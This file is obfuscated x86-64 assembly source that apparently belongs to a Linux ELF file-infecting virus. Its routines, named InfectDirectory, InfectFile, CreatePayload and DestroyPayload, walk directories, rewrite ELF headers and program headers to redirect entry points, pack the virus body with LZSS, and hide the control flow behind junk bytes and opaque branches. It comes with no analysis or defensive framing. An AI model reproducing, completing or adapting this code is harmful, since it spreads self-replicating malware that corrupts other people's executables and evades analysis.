    jmp         ..@utitXlgKoAYU
..@2IJA7I6Ak6mb:
    add         rsp, _UPDATASIG_OFF_size
    pop         r5
    jmp         $+3
db 0xb9
    jmp         $+4
db 0x80, 0x7b
    jmp         $+5
db 0x7d, 0xeb, 0xc8
    jmp         $+3
db 0x94
    jl          ..@P63UowaqEryJ
    jge         ..@P63UowaqEryJ
..@Ena2QH6GxOW4:
    mov         QWORD [rsp+_LZSSE_OFF.inputaddr], r1
    mov         QWORD [rsp+_LZSSE_OFF.outputaddr], r3
    jmp         $+4
db 0xb8, 0xd4
    jb          ..@OnWNhGwt2WvS
    jae         ..@OnWNhGwt2WvS
..@fWBWWmRqDYWB:
    shl         edx, POSITION_BITS+LENGTH_BITS
    js          ..@I4YlFnReoUKU
    jns         ..@I4YlFnReoUKU
..@pZtT4Jf7pkve:
    push        r5
    jmp         $+4
db 0xd3, 0x7e
    jmp         $+3
db 0x17
    jmp         ..@O3CU49gn6YuI
..@icztMKkgH2h9:
    ret
    jl          UpdateSignature
    jge         UpdateSignature
..@XmoNXhztlBNp:
    xor         rax, rax
    mov         ax, WORD [r5+e_h.e_shentsize]
    jmp         $+3
db 0x36
    jb          ..@I3aPZUf1fnkW
    jae         ..@I3aPZUf1fnkW
..@zFGIOHy6tcRH:
    mov         r5, r1
    jmp         $+5
db 0x18, 0xb5, 0xb7
    jmp         ..@megy9bvMWNZh
..@lE4XmHvPKfFi:
    mov         ax, dx
    and         ax, 1111b
    cmp         al, 0xa
    je          ..@VrusKxXcFUIU
    jne         ..@VrusKxXcFUIU
..@MUC4tP1ut4tF:
    mov         QWORD [r2+p_h.p_vaddr], r3
    jmp         $+4
db 0xff, 0x30
    jmp         $+3
db 0x28
    jl          ..@71Uy8CHvEViT
    jge         ..@71Uy8CHvEViT
..@jUFe0gdVKs8B:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    mov         BYTE [rdi], al
    jmp         $+3
db 0xb1
    jmp         ..@wyMW5kX4yqeA
..@lItDzYeuD78T:
    ret
    jmp         $+5
db 0xfa, 0xcf, 0x8c
    jl          ..@jA95S8yFo8Np
    jge         ..@jA95S8yFo8Np
..@QnHXIhhqtrZm:
    mov         r2, QWORD [r1+e_h.e_phoff]
    add         r2, r1
    xor         r4, r4
    jmp         $+5
db 0x2a, 0x88, 0x7b
    jmp         $+3
db 0xe6
    je          ..@KePuDDyRgcqU
    jne         ..@KePuDDyRgcqU
..@rbYwCfFzhhkM:
    add         r4, rax
    cmp         r4, QWORD [rsp+_PROC_OFF.dirnread]
    jl          ..@hqrVdOrH505b
    jmp         $+4
db 0x46, 0x4d
    jmp         $+4
db 0x03, 0xbd
    jl          ..@AYsVGWgDmeA7
    jge         ..@AYsVGWgDmeA7
..@SBgzUianowNO:
    cmp         rcx, QWORD [rdi+s_h.sh_size]
    jge         ..@dMAPu8k6x47E
    jl          ..@NUCBYfq0oUyI
    jge         ..@NUCBYfq0oUyI
..@KePuDDyRgcqU:
    mov         rax, r4
    jl          ..@hm6acdKwHkpT
    jge         ..@hm6acdKwHkpT
WORDToDWORDASCII:
    jmp         ..@p7fbZ6oPEP5n
..@mEu8LLgoeHTN:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         $+3
db 0x78
    jmp         $+3
db 0xfb
    jmp         $+3
db 0xe5
    jmp         ..@22fF8NsJYL72
..@NLPn9wpecmSO:
    mov         QWORD [rsp+_INFDIR_OFF.dirname], r1
    jmp         $+5
db 0x7c, 0xa1, 0x95
    jmp         $+4
db 0xa2, 0x45
    jmp         $+4
db 0xc1, 0x0d
    jmp         ..@SF9vYAmFgLk4
..@BOLDKjOfxgsm:
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    mov         r2w, WORD [rsp+_NBF_OFF.index]
    js          ..@3o3qKjRi7emN
    jns         ..@3o3qKjRi7emN
..@gBsMpprcPZcB:
    xor         rax, rax
    ret
    jmp         $+4
db 0x7c, 0xab
    jb          ..@FiWyyLyeUpyJ
    jae         ..@FiWyyLyeUpyJ
..@lclrsoW7OYyj:
    mov         r4, r5
    mov         r5, [rsp]
    mov         DWORD [r5+file.filefd], eax
    jl          ..@5IPq53m9RQQq
    jge         ..@5IPq53m9RQQq
..@AIenoy2822AB:
    add         rsp, _LZSSE_OFF_size
    jl          ..@icztMKkgH2h9
    jge         ..@icztMKkgH2h9
..@kc23spL8CZgp:
    cmp         r4, 0x00
    jmp         ..@v9bA5dmltWno
..@S7ozA98wTS63:
    mov         r1, rsp
    add         r1, bytes
    mov         r2, 0x100
    jmp         $+3
db 0x87
    jmp         $+5
db 0x5f, 0x4f, 0xcd
    jmp         $+3
db 0x0e
    jmp         $+4
db 0x61, 0xfa
    jmp         ..@IovDJcYkiKjs
..@MxK1s5FVAmr0:
    sub         rax, QWORD [rsp+_LZSSE_OFF.saveoutptr]
    jb          ..@AIenoy2822AB
    jae         ..@AIenoy2822AB
..@1U4zO5AFr8kL:
    cmp         QWORD m7, 0x00
    jb          ..@n1EnFDLeCICk
    jae         ..@n1EnFDLeCICk
..@71Uy8CHvEViT:
    mov         QWORD [r2+p_h.p_paddr], r3
    js          ..@i15tJHddmnid
    jns         ..@i15tJHddmnid
..@jA95S8yFo8Np:
    mov         r1, QWORD [r5+file.filename]
    jmp         $+3
db 0xf1
    jl          ..@PcBahJ4OTBTt
    jge         ..@PcBahJ4OTBTt
..@0zyAKeuvjNXu:
    ret
    jmp         $+3
db 0xa5
    jb          DYNPIEValidation
    jae         DYNPIEValidation
..@Z2XDQwZoDjWb:
    xor         r3, r3
    jl          ..@WxnxR0oVoRCv
    jge         ..@WxnxR0oVoRCv
..@3o3qKjRi7emN:
    call        UpdateSignature
    mov         r1, QWORD [r5+file.fileptr]
    add         r1, signature_len-1
    jmp         $+5
db 0x21, 0xda, 0x0c
    jmp         $+3
db 0x79
    jl          ..@LEGIhAAsWT5o
    jge         ..@LEGIhAAsWT5o
..@djHLpTKCP5jT:
    add         rsp, _DYNPIE_OFF_size
    jmp         $+3
db 0x15
    jmp         $+3
db 0x2b
    jmp         ..@kVvP5h0iOG3E
..@QooXBOs6BP9x:
%ifdef X86_32
    xor         ebp, ebp
    mov         eax, SYS_MMAP2
    int         0x80
%endif
    js          ..@aVYRN4UqgHje
    jns         ..@aVYRN4UqgHje
..@TU6OJvUX9dqE:
    mov         ecx, WINDOW_LENGTH*2
    jmp         $+4
db 0x33, 0xfe
    js          ..@NfzMIlXFBeh2
    jns         ..@NfzMIlXFBeh2
..@TBAjs7NheG9i:
    mov         r1, QWORD [r5+e_h.e_shoff]
    xor         r2, r2
    mov         r2w, WORD [r5+e_h.e_shnum]
    jmp         ..@XmoNXhztlBNp
..@2O9cMKusbfTG:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    jmp         ..@R7zxI4z6eXU9
..@EMN8AcMIGzf6:
    add         rsp, 0x100
    jl          ..@wnYJSQWfltnv
    jge         ..@wnYJSQWfltnv
..@NEIDoPxJmWgb:
    rep         stosb
    jmp         $+5
db 0x36, 0x4f, 0x3f
    jmp         ..@OQF5FjSvzVut
..@AXJpSiX1BaFC:
    xor         rcx, rcx
    xor         rbx, rbx
    xor         rdx, rdx
    jb          ..@qJnsQ5uGOtM7
    jae         ..@qJnsQ5uGOtM7
..@2drQ9p7E6X5B:
    mov         eax, SYS_LSEEK
    jmp         $+4
db 0x6f, 0x2c
    jmp         $+4
db 0xda, 0xbe
    jmp         $+4
db 0xdf, 0x75
    jmp         ..@YrKxFkn2gEUC
..@VKcQMqRRkEhk:
    sub         rsp, _NBF_OFF_size
    jmp         $+5
db 0x31, 0x14, 0xea
    jb          ..@VnAINKrqeTEz
    jae         ..@VnAINKrqeTEz
..@SF9vYAmFgLk4:
    OFILE       [r1], 0x10000
    cmp         eax, 0x03
    js          ..@sbXSN0rnFygl
    jns         ..@sbXSN0rnFygl
..@jXYUOKOrRYZW:
    mov         BYTE [rsp+_INFDIR_OFF.depth], r2b
    jmp         $+3
db 0xfc
    jl          ..@NLPn9wpecmSO
    jge         ..@NLPn9wpecmSO
..@VXU7hXC5Be8K:
    xor         rcx, rcx
    mov         ecx, WINDOW_LENGTH-LOOKAHEAD_LENGTH 
    jmp         ..@IXplQgubUvln
IsELFComplete:
    jmp         ..@pZtT4Jf7pkve
..@UVSkO7x8JyUf:
    shr         dx, 0x4
    add         ecx, 1
    jmp         $+3
db 0xcc
    jl          ..@5WdWuObNs37G
    jge         ..@5WdWuObNs37G
..@5cjzUn7MhpEC:
    mov         r2, m5
    call        NonBinaryFile
    inc         WORD m5
    jmp         $+4
db 0x74, 0x0c
    js          ..@auWP23r0EeLM
    jns         ..@auWP23r0EeLM
..@4aFTQ4jtwioY:
    OFILE       [rsp+_PROC_OFF.buffer], 0x00
    jmp         $+5
db 0x26, 0x37, 0x55
    jl          ..@OR8JNN2SyFvM
    jge         ..@OR8JNN2SyFvM
..@gI2KCXpGiFp0:
    jmp         ..@d4VjqCiyV60p
    jmp         ..@gBsMpprcPZcB
..@91u99dgMgMtA:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+3
db 0xea
    js          ..@gg9pW5Rd4LnE
    jns         ..@gg9pW5Rd4LnE
..@4OHOCu3LDT6m:
    mov         r5, [rsp]
    mov         QWORD [r5+file.fileptr], rax
    xor         rax, rax
    jmp         $+5
db 0x25, 0xe9, 0x16
    jmp         $+3
db 0x92
    jl          ..@LFLG38HDpaun
    jge         ..@LFLG38HDpaun
..@4GKoQwZsuyFj:
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0x8d
    jb          ..@4aFTQ4jtwioY
    jae         ..@4aFTQ4jtwioY
..@XJlbhoejWB54:
    xor         rax, rax
    jmp         ..@2O9cMKusbfTG
..@3RlJxDavXMGM:
    add         rsi, rcx
    sub         rdi, 1
    sub         rsi, 1
    jl          ..@5y1cxhwBUUZZ
    jge         ..@5y1cxhwBUUZZ
..@AsnIjs2YTYSd:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    jmp         $+3
db 0x51
    js          ..@ZiIJKTQUJBn2
    jns         ..@ZiIJKTQUJBn2
..@OeT39gQVTvsA:
    xor         rax, rax
    xor         rdi, rdi
    jmp         $+5
db 0xf4, 0x38, 0xa8
    jmp         $+3
db 0x56
    jmp         $+4
db 0xee, 0x29
    js          ..@VXU7hXC5Be8K
    jns         ..@VXU7hXC5Be8K
..@Fb2tLZKilndv:
    mov         r4, r5
    and         r4, 10b
    jmp         $+5
db 0x6a, 0x10, 0xca
    jmp         ..@5QeJQPXdgat5
..@ngRROfQSqPd6:
    pop         r3
    jmp         $+4
db 0x4f, 0xbc
    jl          ..@zV4T2ybxKG7u
    jge         ..@zV4T2ybxKG7u
..@0ZJhPPfp2Lwz:
    VAR         packed, dirs_root
    jl          ..@desOkUnl34QS
    jge         ..@desOkUnl34QS
..@49zcKvbio6Sf:
    add         rsi, QWORD [rdi+s_h.sh_offset]
    jmp         ..@SBgzUianowNO
..@LFLG38HDpaun:
    jmp         ..@oHIWO5kEZcF0
    jmp         $+5
db 0xbe, 0x26, 0x80
    jl          ..@0eKxYmhd8wzK
    jge         ..@0eKxYmhd8wzK
..@OTiEIID5QIbz:
    add         r1, QWORD [r2]
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+3
db 0xbe
    jmp         ..@530RfEEgsyO3
..@uVUJAci3gQOM:
    mov         r1, rax
    js          ..@4ofg8qU2JwLU
    jns         ..@4ofg8qU2JwLU
..@XvTicxJ9t44I:
    mov         rax, SYS_FORK
    syscall
    test        eax, eax
    jb          ..@wDJBofrJYI1A
    jae         ..@wDJBofrJYI1A
..@m7n3qeerO7To:
    mov         ecx, WINDOW_LENGTH
    jl          ..@3Ld6APQ59pdT
    jge         ..@3Ld6APQ59pdT
..@shwe8m0fFbJL:
    mov         r3, r4
    jmp         $+4
db 0x90, 0xac
    js          ..@IHPiI7ey9H2y
    jns         ..@IHPiI7ey9H2y
..@UrmxHqyTnEEr:
    syscall
    jmp         $+3
db 0xb2
    jmp         $+3
db 0x0c
    jl          ..@jaxQfsxvgq6y
    jge         ..@jaxQfsxvgq6y
DestroyPayload:
    jmp         ..@wnMMJH0ivhJH
..@OnWNhGwt2WvS:
    mov         QWORD [rsp+_LZSSE_OFF.saveoutptr], r3
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+3
db 0xb1
    jl          ..@mzijMClEcB55
    jge         ..@mzijMClEcB55
..@aZ8ON73BPYOY:
    jne         ..@KfARbzWo7a7L
    jmp         ..@Tmxe7TfzkDAc
..@SKxKgqeJ2N2X:
    add         r4, 1
    jmp         $+4
db 0x71, 0x28
    jmp         $+4
db 0xa3, 0xcb
    jb          ..@eGh2d3OWPitd
    jae         ..@eGh2d3OWPitd
..@xMhvDzlrckgo:
    pop         r3
    jl          ..@OLwAaB0PDa8j
    jge         ..@OLwAaB0PDa8j
..@P63UowaqEryJ:
    pop         r4
    jl          ..@95TrBDSbQ4II
    jge         ..@95TrBDSbQ4II
..@Tu1xcVTEFmuj:
    call        Strcpy
    jmp         ..@4GKoQwZsuyFj
..@WaxuBzZ7kUix:
    mov         QWORD [rsp+_DYNPIE_OFF.ptr], r1
    add         r1, e_h.e_shentsize
    jmp         $+5
db 0xb1, 0xf2, 0x8a
    jmp         ..@Pb9HRUSueX5E
..@f3mrQqeDOS5h:
    shl         edi, 0x8
    jmp         $+3
db 0xc7
    jmp         $+5
db 0x20, 0x13, 0x23
    jmp         $+4
db 0x87, 0x33
    jmp         $+3
db 0xbf
    jmp         ..@lE4XmHvPKfFi
..@ChW4jPHqPmoV:
    mov         DWORD [r2+p_h.p_flags], PF_R + PF_X
    mov         DWORD [r2], PT_LOAD
    mov         QWORD [r1+e_h.e_entry], r3
    jmp         ..@w6QAZ6bG7g9O
..@xnsdNi58hWbm:
    mul         r3
    add         rax, p_h.p_type
    jl          ..@kMKiMN0174bj
    jge         ..@kMKiMN0174bj
..@3jBsUfGgdceY:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    jmp         $+3
db 0x59
    jmp         $+5
db 0xae, 0xe5, 0xd1
    jmp         $+5
db 0xce, 0xc4, 0x94
    jmp         ..@nVKVrWaGZRpY
..@99ZUsLPYj2nb:
    add         r1, _signature-_start
    jmp         $+3
db 0x85
    jmp         $+5
db 0x5e, 0x2e, 0x72
    jmp         ..@ppoEfRSNxVQ2
..@wxfr1m3K8hQn:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    je          ..@kiCZIGnl974L
    jne         ..@kiCZIGnl974L
..@IgQ2u6ly1eyh:
    mov         QWORD [rsp+_NBF_OFF.file], r1
    jl          ..@rd81QEQtzY9K
    jge         ..@rd81QEQtzY9K
..@7TilgAxD9PcL:
%ifdef X86_32
    mov         ecx, DWORD [edi+file.filesize]
%endif
    je          ..@vmZ5oBNdssY5
    jne         ..@vmZ5oBNdssY5
..@6WDADubFIjrd:
    jl          ..@gl2kHgEFrlFw
    jmp         ..@3mVcPwsr3rmM
..@EGBL5mok1doB:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    jl          ..@zS7Rq4krfsJN
    jge         ..@zS7Rq4krfsJN
..@Avbi9cUgx45o:
    mov         rax, SYS_MUNMAP
    jmp         ..@vUnR00uVWauc
..@p7fbZ6oPEP5n:
    push        r1
    xor         rdi, rdi
    js          ..@nYqtLqFHP1FY
    jns         ..@nYqtLqFHP1FY
..@KNTQDK931Zgd:
    jmp         ..@6T0moirRolTQ
    jmp         $+4
db 0xee, 0x49
    jmp         ..@SwO1LiWonVoQ
..@sAigFkl1Lo6U:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    je          ..@EThyedjAruyB
    jne         ..@EThyedjAruyB
..@q8bgaPV36m0N:
    ret
    jmp         WORDToDWORDASCII
..@gg9pW5Rd4LnE:
    cmp         rax, 0x00
    jle         ..@AsnIjs2YTYSd
    mov         QWORD [rsp+_PROC_OFF.dirnread], rax
    jmp         $+3
db 0x79
    jmp         ..@zRYdmRoopdYh
..@3UHbWkaLTJ9p:
    je          ..@WEitd0rgpwXf
    mov         r2d, DWORD [r1]
    jmp         $+3
db 0x4f
    jmp         $+4
db 0xa6, 0x1e
    jb          ..@VSqyVn1X4nS0
    jae         ..@VSqyVn1X4nS0
..@sLcm7dm74OXX:
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    jmp         $+4
db 0xe9, 0x1e
    jb          ..@JDI87hjBxRR6
    jae         ..@JDI87hjBxRR6
..@cEIXjhZ7reNf:
    mov         r2, original_virus_len-non_packed_len
    call        LzssEncoder
    mov         rdi, m6
    jmp         $+3
db 0x9c
    jmp         ..@pZX8LuJPe0FQ
..@EThyedjAruyB:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], dl
    jmp         $+3
db 0x7c
    js          ..@G0YwH0Y78FlN
    jns         ..@G0YwH0Y78FlN
..@cUjxnx6qizm0:
    call        InfectFile
    jmp         $+5
db 0xa5, 0x47, 0x18
    jmp         $+3
db 0x54
    js          ..@WEitd0rgpwXf
    jns         ..@WEitd0rgpwXf
..@HyLnKb7NX8zU:
    rep movsb 
    jb          ..@ljGEncg3Zzqr
    jae         ..@ljGEncg3Zzqr
..@VeHdr6sDa8P3:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    js          ..@jUFe0gdVKs8B
    jns         ..@jUFe0gdVKs8B
..@6mhpmUPZIDnv:
    add         r1, non_packed_len+PADDING
    mov         r3, r1
    sub         r3, PADDING
    je          ..@cEIXjhZ7reNf
    jne         ..@cEIXjhZ7reNf
InfectDirectory:
    jmp         ..@XgzoogokTL1t
..@aVYRN4UqgHje:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x17, 0xe8, 0xc2
    jmp         ..@lHliXbJvN7TY
..@1QGs0i7mMllT:
    mov         r2, rax
    jmp         $+4
db 0x69, 0xca
    jmp         ..@Ngpr1MYqSiqi
..@KmKEnozBWPNR:
    cmovl       dx, ax
    mov         BYTE [rsp+_LZSSE_OFF.cmp_len], dl
    jmp         $+5
db 0x20, 0x60, 0x01
    jb          ..@rSn65WBVQJ4n
    jae         ..@rSn65WBVQJ4n
..@utitXlgKoAYU:
    call        MapFile
    cmp         rax, 0
    jmp         ..@xBpNA9oCNN9W
..@qG6hfnmkj5gR:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    jmp         $+3
db 0x7a
    jmp         $+5
db 0xaf, 0x19, 0x47
    jmp         $+5
db 0x04, 0x8a, 0x8c
    je          ..@eXHZfecThxnD
    jne         ..@eXHZfecThxnD
..@SczkplfQzwxi:
    mov         rdi, m6
    jmp         ..@dVpU7A7whf42
..@GMqnqjvfoYEN:
    xor         rdx, rdx
    xor         rax, rax
    mov         dx, WORD [rsp] 
    js          ..@f3mrQqeDOS5h
    jns         ..@f3mrQqeDOS5h
..@FucAtSKbpkVo:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    add         rdi, rax
    jmp         ..@rRSLDS476WgU
..@0eKxYmhd8wzK:
    xor         rax, rax
    jmp         $+3
db 0x4d
    jmp         $+5
db 0xf6, 0x01, 0xbe
    jb          ..@GLB3t6qri8pG
    jae         ..@GLB3t6qri8pG
..@TVbhGC2FQQDg:
    syscall
    js          ..@GVARjriEyAwl
    jns         ..@GVARjriEyAwl
..@4mmBGJJmsVK2:
    pop         r5
    pop         r4
    ret
    jmp         UnmapFile
MapFile:
    jmp         ..@ODUvAIniD2lG
..@OLwAaB0PDa8j:
    pop         r2
    jmp         $+4
db 0x11, 0x6d
    jl          ..@uf7pCeE9yu2B
    jge         ..@uf7pCeE9yu2B
..@gg59sZ09z9DX:
    jne         ..@D8W8e4haqHW2
    mov         r2, QWORD [r5+file.fileptr]
    GGLOBAL     _signature
    jmp         $+5
db 0x1e, 0x9f, 0xf6
    jb          ..@c6MMp94YvWYa
    jae         ..@c6MMp94YvWYa
..@o96WbnU0ObGp:
    mov         WORD [rsp+_DYNPIE_OFF.shnum], r1w
    jmp         ..@3gjiBnuKu8a3
..@pgA709t4in93:
    mov         rax, 1
    jmp         $+5
db 0xaa, 0x9b, 0xd2
    jl          ..@lItDzYeuD78T
    jge         ..@lItDzYeuD78T
..@uf7pCeE9yu2B:
    pop         r1
    jmp         $+3
db 0xea
    jmp         ..@tm0VWgJs0D1Y
..@6T0moirRolTQ:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jmp         $+3
db 0x13
    jmp         ..@O3tb1ZM70Nsm
..@yKoNojihZ1gK:
    add         rdi, rcx
    jmp         $+3
db 0xa5
    je          ..@3RlJxDavXMGM
    jne         ..@3RlJxDavXMGM
..@tMyJH0mFl8ni:
    mov         r5, r1
    jmp         $+4
db 0x1b, 0x10
    jmp         $+5
db 0x6c, 0x1b, 0xc8
    jmp         ..@cEJ4vrpHbyJs
..@QuVmrOi1XL4b:
    cmp         DWORD [rdi+s_h.sh_type], SHT_DYNAMIC
    jne         ..@dMAPu8k6x47E
    js          ..@J8NZZlFxkfj4
    jns         ..@J8NZZlFxkfj4
..@LqU2K8ZALkX7:
    sub         r2, 1
    cmp         r2, 0
    je          ..@YG4t0ZzlmJqI
    jmp         ..@EjhoNlygcQiu
..@nc43UaZocMBo:
    je          ..@XvTicxJ9t44I
    js          ..@uVUJAci3gQOM
    jns         ..@uVUJAci3gQOM
..@iJUKqf3nUkUW:
    call        Strcpy
    jmp         ..@clJhUJMamBel
..@Vnf1GlqQBJYH:
    ret
    jmp         CreatePayload
..@GJJ9NORQFDFZ:
    mov         r2, 1
    jmp         $+4
db 0x6b, 0x91
    jmp         ..@qbbMubU8uoFF
..@sbXSN0rnFygl:
    jl          ..@CMGBtwoLqDKC
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    jmp         $+3
db 0xa7
    jmp         $+3
db 0x8d
    jb          ..@6T0moirRolTQ
    jae         ..@6T0moirRolTQ
..@uqJzlD8IBHg1:
%ifdef X86_32
    mov         edi, r1
    mov         esi, r2
    mov         ecx, r3
%endif
    jmp         $+4
db 0x9a, 0x26
    jmp         ..@FHlyXvChHXUH
..@cYhaOLjkZyAK:
    jnz         ..@IPFTykcEmBz2
    jmp         ..@XJlbhoejWB54
    jmp         $+3
db 0x32
    jmp         $+4
db 0x30, 0xce
    jmp         $+5
db 0x9a, 0x87, 0xf1
    jb          ..@XJlbhoejWB54
    jae         ..@XJlbhoejWB54
..@OQF5FjSvzVut:
    xor         r2, r2
    xor         r3, r3
    xor         r4, r4
    jmp         $+5
db 0x22, 0x8f, 0xf5
    jmp         ..@BOLDKjOfxgsm
..@5Ahu5f3LdaFu:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jmp         $+5
db 0xa8, 0x5c, 0xa1
    jmp         ..@aT3E3I6b36H4
..@UC5Bad51823e:
    push        r2
    sub         rsp, _DYNPIE_OFF_size
    xor         rax, rax
    jmp         $+4
db 0x89, 0xf3
    jb          ..@WaxuBzZ7kUix
    jae         ..@WaxuBzZ7kUix
..@VnAINKrqeTEz:
    mov         WORD [rsp+_NBF_OFF.index], r2w
    jmp         $+4
db 0xfe, 0x8d
    jmp         ..@IgQ2u6ly1eyh
..@ZTbe8i04Q0kx:
    mov         r2, r4
    js          ..@g1f6rOB2R8cC
    jns         ..@g1f6rOB2R8cC
..@NUCBYfq0oUyI:
    cmp         QWORD [rsi+rcx], DT_FLAGS_1
    jne         ..@CoL0HHHSmLRC
    jmp         $+4
db 0x81, 0xe8
    jb          ..@BW4zSPL7xgZB
    jae         ..@BW4zSPL7xgZB
..@nDAHvvWraB6u:
    jmp         ..@mB2MM6GP7vAz
    js          ..@43hnsLqgWWf9
    jns         ..@43hnsLqgWWf9
..@jG7AtIcxecSH:
    jmp         ..@G0YwH0Y78FlN
    jmp         $+3
db 0x22
    js          ..@ejGVuZm0dijq
    jns         ..@ejGVuZm0dijq
..@4Jqj2KJTJ58D:
    jne         ..@6MI4yaj4p437
    jb          ..@6MI4yaj4p437
    jae         ..@6MI4yaj4p437
..@u2TNxEAnbzVI:
    cmp         ecx, DWORD [rsp+_LZSSE_OFF.length]
    jmp         $+3
db 0x2d
    jl          ..@ZTVhtnUqFMxK
    jge         ..@ZTVhtnUqFMxK
..@pZX8LuJPe0FQ:
    add         rdi, non_packed_len
    mov         m7, rdi
    add         m7, rax
    jmp         $+5
db 0x54, 0x51, 0x5a
    jb          ..@SczkplfQzwxi
    jae         ..@SczkplfQzwxi
..@lmU0fQG42Peh:
    cmp         BYTE [r1+5], '/'
    jmp         $+4
db 0x3c, 0xb2
    jmp         $+5
db 0x26, 0x2c, 0x21
    je          ..@gg59sZ09z9DX
    jne         ..@gg59sZ09z9DX
..@yPd4QS887Bhv:
    mov         r2, vsp
    mov         r3, non_packed_len
    call        MemMove
    js          ..@SplDbycgaUEo
    jns         ..@SplDbycgaUEo
..@kmelUkb90j65:
    jz          ..@D8W8e4haqHW2
    and         r2, 1b
    jmp         $+5
db 0xfd, 0xf0, 0xca
    jb          ..@ZUbpyE12IbBq
    jae         ..@ZUbpyE12IbBq
..@ijCo8vmxBOOJ:
    je          ..@F76KGCx60c52
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    call_vsp    Strlen
    jmp         $+4
db 0xf4, 0xa2
    jmp         ..@K1WfYjby1O54
..@qhPfdvIlZRJV:
    add         r4, rax
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jmp         ..@U710cSJ50QEU
..@SwO1LiWonVoQ:
    CFILE       [rsp+_INFDIR_OFF.dirfd]
    jl          ..@CMGBtwoLqDKC
    jge         ..@CMGBtwoLqDKC
..@BgauwM2LYHjW:
    mov         r1, r5
    call_vsp    Strlen
    add         r5, rax
    jb          ..@W57tXk6jOgbI
    jae         ..@W57tXk6jOgbI
..@pak0nsKn44uG:
    cmp         BYTE [r1], 0x39
    jg          ..@gBsMpprcPZcB
    add         r1, 1
    jmp         ..@gI2KCXpGiFp0
..@mLupZgmKjTgX:
    jle         ..@LqU2K8ZALkX7
    jmp         ..@sECNm1iHLKOi
..@O3tb1ZM70Nsm:
    jle         ..@SwO1LiWonVoQ
    mov         QWORD [rsp+_INFDIR_OFF.dirnread], rax
    jb          ..@3jBsUfGgdceY
    jae         ..@3jBsUfGgdceY
..@qJnsQ5uGOtM7:
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    mov         edx, 100000000b
    or          bx, dx
    jmp         $+4
db 0x14, 0xfb
    js          ..@9wfRcwBlTSYt
    jns         ..@9wfRcwBlTSYt
..@megy9bvMWNZh:
    mov         r1, r4
    mov         rax, [r5+file.filesize]
    jb          ..@p6A0HXWEmkUA
    jae         ..@p6A0HXWEmkUA
..@XyRPEYCE91cI:
    jle         ..@0eKxYmhd8wzK
    mov         QWORD [r5+file.filesize], rax
    jmp         ..@rjXvEc6kRPig
..@ygmbdTKTv0Vm:
    add         r4, r3
    jmp         $+3
db 0xbf
    je          ..@3lv7ajh46FZs
    jne         ..@3lv7ajh46FZs
..@gGTvRIIP7KaW:
    call        MemMove
    jmp         ..@d6AE0V20Wp8k
..@sEKo4s3r97zz:
    mov         BYTE [r1], 0x00
    lea         r1, [rsp+_INFDIR_OFF.buffer]
    jmp         $+4
db 0x2f, 0xac
    jmp         $+4
db 0xaf, 0xa9
    jmp         $+3
db 0x7e
    js          ..@vw4UGYZLLGEH
    jns         ..@vw4UGYZLLGEH
..@gfzqCff7mEHq:
    push        r2
    push        r3
    mov         r1, r4
    jmp         ..@r2bkYMXNvZXR
..@LGqj53jvcE8t:
    call        UnmapFile
    jmp         $+4
db 0xbb, 0xdc
    jmp         ..@dzK0HcBQiYib
..@kiCZIGnl974L:
    jl          ..@jHNbPyenPKzf
    jmp         $+5
db 0xbf, 0x5b, 0x07
    jb          ..@RfA6TNgNKJEL
    jae         ..@RfA6TNgNKJEL
..@zVu0AsfzTo0s:
    call        AddSizeMappedFile
    mov         r5, [rsp+_NBF_OFF.file]
    jmp         $+5
db 0x8d, 0xf9, 0xd9
    jmp         ..@0Pl0xvIovRKN
..@plNQS9w4mlWa:
    jne         ..@dzK0HcBQiYib
    jmp         $+4
db 0xa7, 0x52
    jb          ..@u8FtkbA41fDw
    jae         ..@u8FtkbA41fDw
..@5y1cxhwBUUZZ:
    std
    js          ..@lwqI45L5V4OS
    jns         ..@lwqI45L5V4OS
..@YMyLYBCFl8eO:
    push        rax
    jmp         ..@0ZJhPPfp2Lwz
..@q9qIxJxUd2AC:
%ifdef X86_32
    xor         eax, eax
    mov         ecx, original_virus_len+PADDING
%endif
    jmp         $+3
db 0x0a
    js          ..@d8ObTKoBSuar
    jns         ..@d8ObTKoBSuar
..@hQdFsp4FPpcG:
    call        MemMove
    xor         r2, r2
    xor         r3, r3
    jb          ..@kY435vm4sd90
    jae         ..@kY435vm4sd90
..@HlXQas9lBrwe:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@91u99dgMgMtA
..@5HjG9IGyT6zT:
    mov         QWORD [rsp+_VADDR_OFF.tmp_vaddr], 0
    jmp         $+3
db 0x51
    jmp         ..@sLcm7dm74OXX
..@Bn559XmHSLxc:
    mov         DWORD [r5+file.filefd], 0x00
    mov         QWORD [r5+file.filesize], 0x00
    jmp         ..@xRIvUMhNqUoo
..@KCVnV1mIHIHU:
    jne         ..@J7bTRvkcGqyh
    jmp         $+3
db 0x7f
    jmp         ..@FsGmoGbf3Rvs
